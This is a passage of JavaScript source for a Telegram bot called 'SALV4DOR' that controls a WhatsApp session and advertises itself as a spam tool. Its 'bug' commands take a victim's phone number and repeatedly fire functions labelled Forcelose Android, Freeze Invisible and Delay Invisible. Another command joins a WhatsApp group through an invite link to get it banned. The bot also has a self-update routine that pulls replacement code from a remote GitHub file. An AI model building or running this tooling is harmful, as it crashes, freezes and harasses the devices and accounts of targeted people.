        text: "「 λ 𝖢𝖤𝖭𝖳𝖤𝖱 λ 」",
        callback_data: "/controls",
        style: "primary",
        icon_custom_emoji_id:'5341715473882955310'
      },
    ],
    [
      {
        text: "「 λ 𝖳𝖮𝖮𝖫𝖲 λ 」",
        callback_data: "/fun",
        style: "primary",
        icon_custom_emoji_id:'5271604874419647061'
      },
    ],
    [
      {
        text: "「 λ 𝖮𝖶𝖭𝖤𝖱 λ 」",
        url: "https://t.me/parkyoujoung",
        style: "primary",
        icon_custom_emoji_id:'5217822164362739968'
      },
      {
        text: "「 λ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 λ 」",
        url: "https://t.me/Salvadorinformation",
        style: "primary",
        icon_custom_emoji_id:'5282843764451195532'
      },
    ],
  ];

  ctx.replyWithPhoto(thumbnailUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: keyboard,
    },
  });
});

bot.action("/start", async ctx => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
    
    const menuMessage = `
<blockquote><strong><tg-emoji emoji-id="6028575719125159808">🎆</tg-emoji> S ᗩ ᒪ ᐯ 4 ᗪ O ᖇ <tg-emoji emoji-id="5897561886404120587">🌛</tg-emoji></strong></blockquote>
<tg-emoji emoji-id="5769547529993588669">👑</tg-emoji> Developer : @parkyoujoung
<tg-emoji emoji-id="6030579106620378674">🌐</tg-emoji> Platform : Telegram
<tg-emoji emoji-id="5382357040008021292">🆕</tg-emoji> Version : 1.0 [ New Release ]
<tg-emoji emoji-id="6028551194861899805">🛡</tg-emoji> Type Script : Free Spam & Not Spam
<blockquote><strong>☰ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭</strong></blockquote>
☇ ID : ${userId}
☇ Username : ${username}
<blockquote><strong>☰ 𝖲𝖳𝖠𝖳𝖴𝖲</strong></blockquote>
☇ Connection : ${senderStatus}
☇ Runtime : ${runtimeStatus}
`;

  const keyboard = [
    [
      {
        text: "「 λ 𝖷—𝖡𝖴𝖦𝖲 λ 」",
        callback_data: "/bug",
        style: "primary",
        icon_custom_emoji_id:'5987813726412083870'
      },
      {
        text: "「 λ 𝖢𝖤𝖭𝖳𝖤𝖱 λ 」",
        callback_data: "/controls",
        style: "primary",
        icon_custom_emoji_id:'5341715473882955310'
      },
    ],
    [
      {
        text: "「 λ 𝖳𝖮𝖮𝖫𝖲 λ 」",
        callback_data: "/fun",
        style: "primary",
        icon_custom_emoji_id:'5271604874419647061'
      },
    ],
    [
      {
        text: "「 λ 𝖮𝖶𝖭𝖤𝖱 λ 」",
        url: "https://t.me/parkyoujoung",
        style: "primary",
        icon_custom_emoji_id:'5217822164362739968'
      },
      {
        text: "「 λ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 λ 」",
        url: "https://t.me/Salvadorinformation",
        style: "primary",
        icon_custom_emoji_id:'5282843764451195532'
      },
    ],
  ];

  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: thumbnailUrl,
        caption: menuMessage,
        parse_mode: "HTML",
      },
      {
        reply_markup: {
          inline_keyboard: keyboard,
        },
      }
    );
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});

bot.action("/controls", async ctx => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
  const controlsMenu = `
<blockquote><strong>☰ S ᗩ ᒪ ᐯ 4 ᗪ O ᖇ</strong></blockquote>
☇ Developer : @parkyoujoung
☇ Version: 1.0
☇ Platform : Telegram
☇ Type : Free Spam and Not Spam
<blockquote><strong>☰ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭</strong></blockquote>
☇ ID : <code>${userId}</code>
☇ Username : ${username}
<blockquote><strong>☰ 𝖲𝖳𝖠𝖳𝖴𝖲</strong></blockquote>
☇ Connection : ${senderStatus}
☇ Runtime : ${runtimeStatus}
<blockquote><strong>☰ 𝖢𝖮𝖭𝖳𝖱𝖮𝖫 𝖢𝖤𝖭𝖳𝖤𝖱</strong></blockquote>
‎↯ /addsender - Add Sender Number
‎↯ /resetsesi - Reset Session
‎↯ /setcd - Set Bot Cooldown
‎↯ /addprem - Add Premium Users
‎↯ /delprem - Delete Premium Users
‎↯ /addpremgb - Add Premium Group
‎↯ /delpremgb - Delete Premium Group
‎↯ /blockcmd - Disable Command
‎↯ /opencmd - Enable Command
‎↯ /addadmin - Add Admin Access
‎↯ /deladmin - Delete Access Admin
`;

  const keyboard = [
    [
      {
        text: "「 λ 𝖡𝖠𝖢𝖪 λ 」",
        callback_data: "/start",
        style: "primary",
      },
      {
        text: "「 λ 𝖮𝖶𝖭𝖤𝖱 λ 」",
        url: "https://t.me/parkyoujoung",
        style: "primary",
      },
      {
        text: "「 λ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 λ 」",
        url: "https://t.me/Salvadorinformation",
        style: "primary",
      },
    ],
  ];

  try {
    await ctx.editMessageCaption(controlsMenu, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    });
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});

bot.action("/bug", async ctx => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
  const bugMenu = `
<blockquote><strong>☰ S ᗩ ᒪ ᐯ 4 ᗪ O ᖇ</strong></blockquote>
☇ Developer : @parkyoujoung
☇ Version: 1.0
☇ Platform : Telegram
☇ Type : Free Spam and Not Spam
<blockquote><strong>☰ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭</strong></blockquote>
☇ ID : <code>${userId}</code>
☇ Username : ${username}
<blockquote><strong>☰ 𝖲𝖳𝖠𝖳𝖴𝖲</strong></blockquote>
☇ Connection : ${senderStatus}
☇ Runtime : ${runtimeStatus}
<blockquote><strong>☰ 𝖡𝖴𝖦 𝖬𝖤𝖭𝖴</strong></blockquote>
‎↯ /xover → Delay Invisible
‎↯ /xorce → Forcelose Android
‎↯ /blanc → Blank Click
‎↯ /fearful → Freeze Invisible
‎↯ /chloe → Delay Invisible V2
‎↯ /voltex → Forcelose Click
<blockquote><strong>☰ 𝖡𝖠𝖭𝖭𝖤𝖣 𝖦𝖱𝖮𝖴𝖯</strong></blockquote>
‎↯ /baneado → Banned Group [ Testering ]
`;

  const keyboard = [
    [
      {
        text: "「 λ 𝖡𝖠𝖢𝖪 λ 」",
        callback_data: "/start",
        style: "primary",
      },
      {
        text: "「 λ 𝖮𝖶𝖭𝖤𝖱 λ 」",
        url: "https://t.me/parkyoujoung",
        style: "primary",
      },
      {
        text: "「 λ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 λ 」",
        url: "https://t.me/Salvadorinformation",
        style: "primary",
      },
    ],
  ];

  try {
    await ctx.editMessageCaption(bugMenu, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    });
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});

bot.action("/fun", async ctx => {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✅ Connected" : "❌ Disconnected";
  const funMenu = `
<blockquote><strong>☰ S ᗩ ᒪ ᐯ 4 ᗪ O ᖇ</strong></blockquote>
☇ Developer : @parkyoujoung
☇ Version: 1.0 [ New Release ]
☇ Platform : Telegram
☇ Type : Free Spam and Not Spam
<blockquote><strong>☰ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭</strong></blockquote>
☇ ID : <code>${userId}</code>
☇ Username : ${username}
<blockquote><strong>☰ 𝖲𝖳𝖠𝖳𝖴𝖲</strong></blockquote>
☇ Connection : ${senderStatus}
☇ Runtime : ${runtimeStatus}
<blockquote><strong>☰ 𝖳𝖮𝖮𝖫𝖲 𝖬𝖤𝖭𝖴</strong></blockquote>
‎↯ /iqc - Iphone Quote Chat
‎↯ /csessions - Scan Sender With Adp
‎↯ /tourl - Convert to URL
‎↯ /spotify - Search Music
‎↯ /tiktokdl - Download Video Tiktok  
‎↯ /testfunc - Function Test
‎↯ /cekfunc - Check Error Function
‎↯ /trackweb - Tracking Website
‎↯ /statusweb - Check Status Website
‎↯ /cekid - Check Id Website
‎↯ /cekbio - Check Bio WhatsApp
‎↯ /reactch - Reacting to Channel
`;

  const keyboard = [
    [
      {
        text: "「 λ 𝖡𝖠𝖢𝖪 λ 」",
        callback_data: "/start",
        style: "primary",
      },
      {
        text: "「 λ 𝖮𝖶𝖭𝖤𝖱 λ 」",
        url: "https://t.me/parkyoujoung",
        style: "primary",
      },
      {
        text: "「 λ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 λ 」",
        url: "https://t.me/Salvadorinformation",
        style: "primary",
      },
    ],
  ];

  try {
    await ctx.editMessageCaption(funMenu, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard,
      },
    });
  } catch (error) {
    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description === "Error"
    ) {
      await ctx.answerCbQuery();
    } else {
    }
  }
});

// ================ Block & Open Cmd ================
const cmdFile = "./database/cmd.json";

let cmdData = { blocked: [] };

if (fs.existsSync(cmdFile)) {
  try {
    cmdData = JSON.parse(fs.readFileSync(cmdFile));
  } catch (err) {
    cmdData = { blocked: [] };
  }
}

function saveCmd() {
  fs.writeFileSync(cmdFile, JSON.stringify(cmdData, null, 2));
}

function isCommandBlocked(cmd) {
  return cmdData.blocked.includes(cmd);
}

bot.command("blockcmd", async ctx => {
  if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
    return ctx.reply("❌ Akses hanya untuk owner/admin");
  }
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format:\n/blockcmd /command");
  }
  const command = args[1].toLowerCase();
  if (!cmdData.blocked.includes(command)) {
    cmdData.blocked.push(command);
    saveCmd();
  }
  ctx.reply(`🚫 Command ${command} berhasil diblokir.`);
});

bot.command("opencmd", async ctx => {
  if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
    return ctx.reply("❌ Akses hanya untuk owner/admin");
  }
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format:\n/opencmd /command");
  }
  const command = args[1].toLowerCase();
  cmdData.blocked = cmdData.blocked.filter(c => c !== command);
  saveCmd();
  ctx.reply(`✅ Command ${command} sudah dibuka.`);
});

//============( CASE BUG ALL MENU BUGS ) =======\\
bot.command(
  "xorce",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/xorce")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    try {
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 ☇ Format: /xorce 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target : ${q}
┊々 Type : Forcelose Android
┊々 Status : Processing....
\`\`\``;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "Markdown",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 5; i++) {
            console.log(chalk.yellow(`✅ Success sending bugs to target`));
            await FcNoClick(sock, target);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target : ${q}
┊々 Type : Forcelose Android
┊々 Status : ✅ Success
┊々 Attack From : ${username}
\`\`\``,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          console.log("error xorce:");
          console.log(err);
        }
      })();
    } catch (err) {
      console.log("command xorce error:");
      console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan xorce.");
    }
  }
);

bot.command(
  "voltex",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/voltex")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    try {
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 ☇ Format: /voltex 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Forcelose Click
┊々 Status: Processing....
\`\`\``;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "Markdown",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 5; i++) {
            console.log(chalk.yellow(`✅ Success sending bugs to target`));
            await FcClickWork(sock, target);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target : ${q}
┊々 Type : Forcelose Click
┊々 Status : ✅ Success
┊々 Attack From : ${username}
\`\`\``,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          console.log("error voltex:");
          console.log(err);
        }
      })();
    } catch (err) {
      console.log("command voltex error:");
      console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan voltex.");
    }
  }
);

bot.command(
  "xover",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/xover")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    try {
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 ☇ Format: /xover 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target : ${q}
┊々 Type : Delay Invisible
┊々 Status : Processing....
\`\`\``;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "Markdown",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 5; i++) {
            console.log(chalk.yellow(`✅ Success sending bugs to target`));
            await monkey(sock, target);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target : ${q}
┊々 Type : Delay Invisible
┊々 Status : ✅ Success
┊々 Attack From : ${username}
\`\`\``,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          console.log("error xover:");
          console.log(err);
        }
      })();
    } catch (err) {
      console.log("command xover error:");
      console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan xover.");
    }
  }
);

bot.command(
  "chloe",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/chloe")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    try {
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 ☇ Format: /chloe 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target : ${q}
┊々 Type : Delay Invisible V2
┊々 Status : Processing...
\`\`\``;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "Markdown",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 5; i++) {
            console.log(chalk.yellow(`✅ Success sending bugs to target`));
            await DenglayKXA(sock, target);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target : ${q}
┊々 Type : Delay Invisible V2
┊々 Status : ✅ Success
┊々 Attack From : ${username}
\`\`\``,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          console.log("error xover:");
          console.log(err);
        }
      })();
    } catch (err) {
      console.log("command xover error:");
      console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan xover.");
    }
  }
);

bot.command(
  "blanc",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/blanc")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    try {
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 ☇ Format: /blanc 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target : ${q}
┊々 Type : Blank Click
┊々 Status : Processing...
\`\`\``;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "Markdown",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 5; i++) {
            console.log(chalk.yellow(`✅ Success sending bugs to target`));
            await venishernew(sock, target);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target : ${q}
┊々 Type : Blank Click
┊々 Status : ✅ Success
┊々 Attack From : ${username}
\`\`\``,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          console.log("error blanc:");
          console.log(err);
        }
      })();
    } catch (err) {
      console.log("command blanc error:");
      console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan blanc.");
    }
  }
);

bot.command(
  "fearful",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/fearful")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    try {
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 ☇ Format: /fearful 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target : ${q}
┊々 Type : Freeze Invisible
┊々 Status : Processing...
\`\`\``;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "Markdown",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 5; i++) {
            console.log(chalk.yellow(`✅ Success sending bugs to target`));
            await exx(sock, target);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target : ${q}
┊々 Type : Freeze Invisible
┊々 Status : ✅ Success
┊々 Attack From : ${username}
\`\`\``,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          console.log("error fearful:");
          console.log(err);
        }
      })();
    } catch (err) {
      console.log("command fearful error:");
      console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan fearful.");
    }
  }
);

// =================== BANNED GROUP ===================
bot.command(
  "baneado",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/baneado")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }

    const chatId = ctx.chat.id;
    const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
    const args = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!args) {
      return ctx.reply(
        "🪧 ☇ Format:\n/baneado <link_undangan|group_id>\n\nExample:\n/baneado https://chat.whatsapp.com/ABCdef123\n/baneado 123456789@g.us"
      );
    }

    let groupJid;

    try {
      const inviteRegex = /https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
      const matchInvite = args.match(inviteRegex);

      if (matchInvite) {
        const code = matchInvite[1];
        const progressMsg = await ctx.reply("⏳ Bergabung ke grup via link...");
        
        try {
          const joinResult = await sock.groupAcceptInvite(code);
          groupJid = joinResult;
          await ctx.telegram.editMessageText(
            chatId,
            progressMsg.message_id,
            undefined,
            `✅ Berhasil bergabung ke grup: ${groupJid}`
          );
        } catch (joinErr) {
          const errMsg = (joinErr?.message || "").toLowerCase();
          
          if (errMsg.includes("conflict") || errMsg.includes("already") || errMsg.includes("member") || errMsg.includes("exists")) {
            try {
              console.log(`⚠️ Conflict/Already member, mencoba ambil JID...`);
              const inviteInfo = await sock.groupGetInviteInfo(code);
              groupJid = inviteInfo.id;
              console.log(`✅ Berhasil ambil JID grup: ${groupJid}`);
              await ctx.telegram.editMessageText(
                chatId,
                progressMsg.message_id,
                undefined,
                `✅ Sudah bergabung, melanjutkan ke grup: ${groupJid}`
              );
            } catch (infoErr) {
              console.log(`❌ Gagal ambil JID: ${infoErr.message}`);
              return ctx.reply(`❌ Gagal memproses grup: ${infoErr.message}`);
            }
          } else {
            console.log(`❌ Error join: ${joinErr.message}`);
            return ctx.reply(`❌ Gagal memproses grup: ${joinErr.message}`);
          }
        }
      } else {
        if (!args.endsWith("@g.us")) {
          return ctx.reply("❌ ID grup harus diakhiri dengan @g.us atau gunakan link undangan.");
        }
        groupJid = args;
      }
    } catch (err) {
      return ctx.reply(`❌ Gagal memproses grup: ${err.message}`);
    }

    const processMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Pengirim : ${username}
┊々 Target : ${groupJid}
┊々 Status : Processing....
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "「🔍」View Group ",
                url: "https://chat.whatsapp.com/"
              }
            ]
          ]
        }
      }
    );

    const processMessageId = processMessage.message_id;

    try {
      await bangb(sock, jid);

      await ctx.telegram.editMessageCaption(
        chatId,
        processMessageId,
        undefined,
        `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Pengirim : ${username}
┊々 Target : ${groupJid}
┊々 Status : ✅ Success!
\`\`\``,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "「📱」Check Group ",
                  url: "https://wa.me/13135550002"
                }
              ]
            ]
          }
        }
      );
    } catch (err) {
  console.error("=== Error ===");
  console.error(err);
  console.error(err.stack);
      await ctx.telegram.editMessageCaption(
        chatId,
        processMessageId,
        undefined,
        `\`\`\`js
.☘︎ ݁˖┊ SALV4DOR IS HERE 1.0
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Pengirim : ${username}
┊々 Target : ${groupJid}
┊々 Status : ❌ Failed: ${err.message}
\`\`\``,
        {
          parse_mode: "Markdown"
        }
      );
    }
  }
);

//============( FUNCTION ) =======\\


//============( AUTO UPDATE ) =======\\
const UPDATE_URL = "https://raw.githubusercontent.com/parkyoujoung123/SalvadorUpdates/refs/heads/main/index.js";
const UPDATE_FILE_PATH = path.join(__dirname, "index.js");
const UPDATE_TEMP_PATH = path.join(__dirname, ".index.js.update.tmp");
const UPDATE_BACKUP_PATH = path.join(__dirname, "index.js.backup");

function downloadUpdate(url, outputPath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(outputPath);
    let settled = false;
    const finish = error => {
      if (settled) return;
      settled = true;
      file.close(() => {
        if (error) fs.rm(outputPath, { force: true }, () => {});
        error ? reject(error) : resolve();
      });
    };

    const request = https.get(url, { headers: { "User-Agent": "SalvadorBot-Updater" } }, res => {
      if (res.statusCode !== 200) {
        res.resume();
        return finish(new Error(`HTTP_${res.statusCode}`));
      }
      res.pipe(file);
      file.once("finish", () => finish());
    });
    request.setTimeout(30000, () => request.destroy(new Error("UPDATE_TIMEOUT")));
    request.once("error", finish);
    file.once("error", finish);
  });
   } 
    


//============( END ) =======\\
bot.launch();
process.on("uncaughtException", err => {
  console.error("Uncaught Exception:", err.message);
    });

process.on("unhandledRejection", err => {
  console.error("Unhandled Rejection:", err);
});